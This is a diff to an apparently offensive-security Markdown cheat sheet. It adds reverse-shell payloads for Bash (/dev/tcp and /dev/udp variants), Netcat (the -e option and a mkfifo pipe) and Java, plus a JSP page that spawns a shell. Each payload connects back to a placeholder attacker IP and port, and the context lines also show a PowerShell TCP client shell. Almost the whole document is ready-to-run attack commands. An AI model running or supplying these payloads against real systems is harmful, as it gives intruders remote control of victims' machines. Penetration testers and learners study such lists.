@@ -7,6 +7,9 @@
 - [Reverse Shells](#reverse-shells)
   * [JavaScript](#javascript)
   * [PowerShell](#powershell)
+  * [Bash](#bash)
+  * [Netcat](#netcat)
+  * [Java](#java)
 
 ---
 
@@ -52,3 +55,53 @@ $client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$strea
 iconv -f ASCII -t UTF-16LE shellcode.txt | base64 | tr -d "\n"
 ```
 
+### Bash
+- Doing it `bash` (and  `sh`) style
+
+```bash
+bash -l > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+
+# Or
+
+bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
+
+# Or
+0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196
+
+# Or UDP
+sh -i >& /dev/udp/<attacker_ip>/<port> 0>&1
+```
+
+### Netcat
+- Reverse shell using different `netcat` flavours
+
+```bash
+# Traditional
+nc <attacker_ip> <port> -e /bin/bash
+
+# OpenBSD (no -e available)
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f
+```
+
+### Java
+- If `java` is needed
+
+```java
+Runtime r = Runtime.getRuntime();
+Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/<attacker_ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+p.waitFor();
+```
+
+- If `jsp` is needed (above one is not working all the time)
+
+```jsp
+<%@ page import="java.io.*" %>
+<%
+    try {
+         Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -l > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1"});
+    }
+    catch(IOException e) {
+         e.printStackTrace();
+    }
+%>
+```
